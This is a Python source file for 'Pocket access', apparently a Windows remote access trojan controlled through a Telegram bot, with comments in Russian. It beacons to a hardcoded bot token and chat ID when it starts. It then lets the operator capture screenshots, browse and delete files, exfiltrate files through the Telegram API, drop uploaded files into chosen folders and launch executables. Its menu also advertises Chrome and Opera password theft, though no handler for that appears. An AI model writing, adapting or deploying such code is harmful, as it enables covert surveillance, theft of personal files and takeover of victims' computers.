import telebot # Для работы с ботом
import os # Для работы с директориями / файлами
import requests # Для отправки документов / скринов
from PIL import ImageGrab # Для получения скриншота
import socket
from telebot import types

bot_token = "5658659173:AAHvR-fKpxmjEjWZdiWCA5pO2ANeJaZFSQE" # Токен от бота
chat_id = "888929480" # ID чата

bot = telebot.TeleBot(bot_token)

requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text=Pocket access Online")

@bot.message_handler(commands=['start', 'Start']) # Ждём команды Start / start
def start(message):
    rmk = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btns = ["/Screen", "/ip", "/delete_file", "/check_dir", "/passwords chrome",
            "/passwords opera", "/Open_url", "/Ls", "/delete_file", "/download_file", "/unloud_file", "/start_process", "/About"]

    for btn in btns:
        rmk.add(types.KeyboardButton(btn))

    bot.send_message(chat_id, "Выберите действие:", reply_markup=rmk)

@bot.message_handler(commands=['screen', 'Screen']) # Ждём команды
def send_screen(command) :
    bot.send_message(chat_id, "Wait...") # Отправляем сообщение "Wait..."
    screen = ImageGrab.grab() # Создаём переменную, которая равна получению скриншота
    screen.save(os.getenv("APPDATA") + '\\Sreenshot.jpg') # Сохраняем скриншот в папку AppData
    screen = open(os.getenv("APPDATA") + '\\Sreenshot.jpg', 'rb') # Обновляем переменную
    files = {'photo': screen} # Создаём переменную для отправки POST запросом
    requests.post("https://api.telegram.org/bot" + bot_token + "/sendPhoto?chat_id=" + chat_id , files=files) # Делаем запрос

@bot.message_handler(commands=['ip'])
def check_start(message):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("17.13.109.124", 80))
    print(s.getsockname()[0])
    bot.send_message(message.chat.id, 'Ip: ' + s.getsockname()[0])
    s.close()

@bot.message_handler(commands=['check_dir'])
def check_start(message):
    msg = bot.send_message(message.chat.id, 'Начем с начала в C: \n'+ str(os.listdir('C:/')) + '\n \n Введи следущюю директорию например C:/low/high.exe! Что-бы выйти пропиши /stop_dir')
    bot.register_next_step_handler(msg, check_cotegory)

def check_cotegory(message):
    if(message.text ==  '/stop_dir'):
        start(message)
    else:
        dir = message.text
        try:
            msg1 = bot.send_message(message.chat.id, 'В директории '+ dir +' есть: '+ str(os.listdir(dir)) + '\n \n Введи следущюю директорию ')
            bot.register_next_step_handler(msg1, check_cotegory)
        except:
            msg1 = bot.send_message(message.chat.id, 'Такой директории нет, введи ещё раз дерикторю')
            bot.register_next_step_handler(msg1, check_cotegory)

@bot.message_handler(commands=['delete_file'])
def isfile(message):
    msg = bot.send_message(message.chat.id, 'Введи дерикторию файла например C:/jojo/jojo_1.exe')
    bot.register_next_step_handler(msg, del_file)

def del_file(message):
    del_direct = message.text
    try:
        os.remove(del_direct)
        bot.send_message(message.chat.id, 'Успешно! файл удален')
    except:
        bot.send_message(message.chat.id, 'Произошла ошибка')

@bot.message_handler(commands=["ls", "Ls"]) # ВСЕ ФАЙЛЫ
def ls_dir(commands):
    dirs = '\n'.join(os.listdir(path=".")) # Обявим переменную dirs, в которой содержатся все папки и файлы.
    bot.send_message(chat_id, "Files: " + "\n" + dirs)

@bot.message_handler(commands=["cd", "Cd"]) # ПЕРЕЙТИ В ПАПКУ
def cd_dir(message):
    user_msg = "{0}".format(message.text)
    path2 = user_msg.split(" ")[1] # Переменная - папка
    os.chdir(path2) # Меняем директорию
    bot.send_message(chat_id, "Директория изменена на " + path2)


@bot.message_handler(commands=['download_file'])
def download_file_info(message):
    msg = bot.send_message(message.chat.id, 'Введи директорию на файл, например: C:/take/music.mp4')
    bot.register_next_step_handler(msg, download_file)


def download_file(message):
    try:

        dire = message.text
        data = open(dire, 'rb')
        size = os.path.getsize(dire)
        if (size > 52428800):
            size_mb = int((size / 1024) / 1024)
            bot.send_message(message.chat.id,
                             'Этот файл больше 50 мб! его не удатся скачать( А вернее ' + str(size_mb) + 'мб')
        else:
            bot.send_document(message.chat.id, data)
            data.close()
    except:
        bot.send_message(message.chat.id, 'такого файла нет')

@bot.message_handler(commands=['delete_file'])
def isfile(message):
    msg = bot.send_message(message.chat.id, 'Введи дерикторию файла например C:/jojo/jojo_1.exe')
    bot.register_next_step_handler(msg, del_file)

def del_file(message):
    del_direct = message.text
    try:
        os.remove(del_direct)
        bot.send_message(message.chat.id, 'Успешно! файл удален')
    except:
        bot.send_message(message.chat.id, 'Произошла ошибка')


@bot.message_handler(commands=['unloud_file'])
def unloud_file_wath_dir(message):
    msg = bot.send_message(message.chat.id,
                           'Введи дерикторию куда будут закачены файлы например C:/Users/AppData/Local/Temp')
    bot.register_next_step_handler(msg, unloud_file_wath_file)


def unloud_file_wath_file(message):
    global dirt
    dirt = message.text
    msg = bot.send_message(message.chat.id, 'Скинь файл')
    bot.register_next_step_handler(msg, unloud_file)


def unloud_file(message):
    print(dirt)
    dire = dirt
    try:
        chat_id = message.chat.id

        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)

        src = dire + '/' + message.document.file_name;
        with open(src, 'wb') as new_file:
            new_file.write(downloaded_file)

        bot.reply_to(message, "Успешно! файл был сохронен в директории " + dire)
    except Exception as e:
        bot.reply_to(message, e)

@bot.message_handler(commands=['start_process'])
def check_start(message):
    msg = bot.send_message(message.chat.id, 'Введи дерикторию exe-шника или имя процесса')
    bot.register_next_step_handler(msg, start_process)

def start_process(message):
    dir_process = message.text
    try:
        os.startfile(dir_process)
        bot.send_message(message.chat.id, 'Процесс успешно запущен')
    except:
        bot.send_message(message.chat.id, 'Такого процесса или exe-шника нет!!!')

@bot.message_handler(commands = ["About", "about"]) # ОПИСАНИЕ
def about(commands):
    bot.send_message(chat_id, "https://github.com/Dimitrescuu/Pocket-access")

bot.polling()
